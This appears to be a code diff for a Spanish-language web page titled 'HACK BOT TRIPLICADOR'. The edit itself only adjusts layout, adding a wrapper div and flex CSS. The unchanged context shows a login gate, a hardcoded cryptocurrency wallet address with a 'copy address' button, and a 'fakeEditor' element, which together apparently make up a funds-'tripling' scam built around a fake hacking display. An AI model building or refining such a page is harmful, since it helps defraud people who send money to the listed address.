@@ -24,6 +24,7 @@
     <button id="btnLogin">Iniciar Sesión</button>
     <p>¿No tienes cuenta? <span id="irARegistro" style="cursor:pointer; color:blue;">Registrarse</span></p>
 </div>
+    <div class="content-wrapper">
 
 <div id="game-container" style="display:none;">
     <h1>HACK BOT TRIPLICADOR</h1>
@@ -40,23 +41,26 @@
         
     <button id="copyAddress" style="display:none;">CoPY ADDRESS  </button> <!-- Ocultar inicialmente -->
     <p id="providedAddress" style="display:block;">0x01C65F22A9478C2932e62483509c233F0aaD5c72</p> <!-- Visible por defecto -->
-   
+      </div>
+ 
 
   <style>
-      body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: #0a0a0a;
-            color: #0f0;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            
-            justify-content: space-between;
-        }
+     body {
+        display: flex;
+        flex-direction: column; /* Organiza el contenido en columna */
+        justify-content: space-between; /* Distribuye el espacio, poniendo el `fakeEditor` al final */
+        height: 100vh; /* Usa el 100% de la altura de la ventana */
+        margin: 0;
+    }
 
         h1, h2 {
             color: #ff073a;
         }
+
+.content-wrapper {
+        flex: 1; /* Hace que el contenedor de contenido ocupe el espacio disponible */
+    }
+      
 
         input[type="text"], input[type="password"], input[type="email"] {
             background-color: #222;
@@ -143,7 +147,6 @@
  <div class="editor-container">
     <div id="fakeEditor">
  </div>
-</div>
    
 </body>
   <script>
